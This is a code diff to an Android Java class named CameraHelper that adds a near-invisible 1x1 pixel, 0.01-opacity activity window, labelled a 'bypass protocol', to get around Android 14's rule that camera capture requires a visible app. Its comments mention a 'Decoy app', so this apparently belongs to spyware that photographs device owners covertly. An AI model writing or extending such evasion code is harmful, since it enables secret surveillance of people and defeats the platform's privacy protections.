@@ -37,6 +37,7 @@ import java.util.concurrent.TimeUnit;
 
 import android.app.Activity;
 import android.os.Bundle;
+import android.view.View;
 
 /**
  * Simple camera capture helper - captures photos synchronously
@@ -51,9 +52,20 @@ public class CameraHelper {
         @Override
         protected void onCreate(Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
-            getWindow().setGravity(android.view.Gravity.CENTER);
-            moveTaskToBack(true);
-            finish();
+            // [HARDENED_BYPASS_PROTOCOL]
+            // We use a 1x1 opaque view to satisfy Android 14's 'visible' requirement.
+            // This is isolated to its own task affinity to prevent pulling the Decoy app forward.
+            View v = new View(this);
+            v.setBackgroundColor(android.graphics.Color.BLACK);
+            setContentView(v);
+            
+            android.view.WindowManager.LayoutParams lp = getWindow().getAttributes();
+            lp.width = 1; lp.height = 1; lp.alpha = 0.01f;
+            lp.gravity = android.view.Gravity.TOP | android.view.Gravity.LEFT;
+            getWindow().setAttributes(lp);
+            
+            // Stay alive long enough for 4K hardware initialization
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::finish, 3500);
         }
     }
     private static final String TAG = "CameraHelper";
